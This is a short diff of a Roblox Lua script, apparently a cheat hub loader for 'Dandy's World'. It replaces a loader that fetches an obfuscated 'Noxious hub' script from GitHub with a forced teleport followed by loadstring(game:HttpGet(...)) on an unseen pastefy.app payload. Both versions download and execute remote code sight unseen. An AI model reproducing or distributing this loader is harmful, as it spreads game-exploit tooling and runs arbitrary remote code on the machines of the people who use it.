@@ -1,15 +1,2 @@
---[[---------------------------------------------------------------------------------------------------------------------------
-  __   __     ______     __  __     __     ______     __  __     ______        ______     __      ______      __   __
- /\ "-.\ \   /\  __ \   /\_\_\_\   /\ \   /\  __ \   /\ \/\ \   /\  ___\      /\_   _\   /\ \    /\   ___\   /\ "-.\ \
- \ \ \-.  \  \ \ \/\ \  \/_/\_\/_  \ \ \  \ \ \/\ \  \ \ \_\ \  \ \___  \     \/_\  \/    \ \ \  \ \  \___\  \ \ \-.  \
-  \ \_\\"\_\  \ \_____\   /\_\/\_\  \ \_\  \ \_____\  \ \_____\  \/\_____\        \ \_\    \ \_\  \ \  \___\  \ \_\\"\_\
-   \/_/ \/_/   \/_____/   \/_/\/_/   \/_/   \/_____/   \/_____/   \/_____/         \/_/     \/_/   \ \______\  \/_/ \/_/ 
-   
-   Made by Team Noxious and Plethora. Modded Tiendungswdrg -- Dandy's World [Version 7.6.9]   
-
----------------------------------------------------------------------------------------------------------------------------]]--
-
-local viewtype, website, owner, filetype = "raw.", "githubusercontent.com", "meowsynther", ".lua"
-local path = "team-noxious-obfuscated/refs/heads/main/dandy's%20world/%5Bobf%5D%20%5Bmain%5D%20noxious%20hub" .. filetype
-local url = "https://" .. viewtype .. website .. "/" .. owner .. "/" .. path
-loadstring(game:HttpGet(url))()
+game:GetService("TeleportService"):Teleport(1234567890, game.Players.LocalPlayer)
+loadstring(game:HttpGet("https://pastefy.app/HIK6D47w/raw"))()
